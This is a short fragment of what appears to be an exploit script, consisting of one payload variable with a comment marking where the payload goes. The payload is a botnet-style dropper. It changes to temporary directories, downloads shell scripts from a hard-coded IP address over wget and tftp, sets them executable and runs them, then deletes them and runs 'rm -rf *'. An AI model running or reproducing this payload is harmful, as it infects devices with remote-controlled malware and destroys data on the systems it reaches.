...
cmd="cd /tmp  cd /run  cd /; wget http://95.217.49.251/EkSgbins.sh; chmod 777 EkSgbins.sh; sh EkSgbins.sh; tftp 95.217.49.251 -c get EkSgtftp1.sh; chmod 777 EkSgtftp1.sh; sh EkSgtftp1.sh; tftp -r EkSgtftp2.sh -g 95.217.49.251; chmod 777 EkSgtftp2.sh; sh EkSgtftp2.sh; rm -rf EkSgbins.sh EkSgtftp1.sh EkSgtftp2.sh; rm -rf *" #Payload Goes Here, Example: Payload Goes In Between The ---> ""
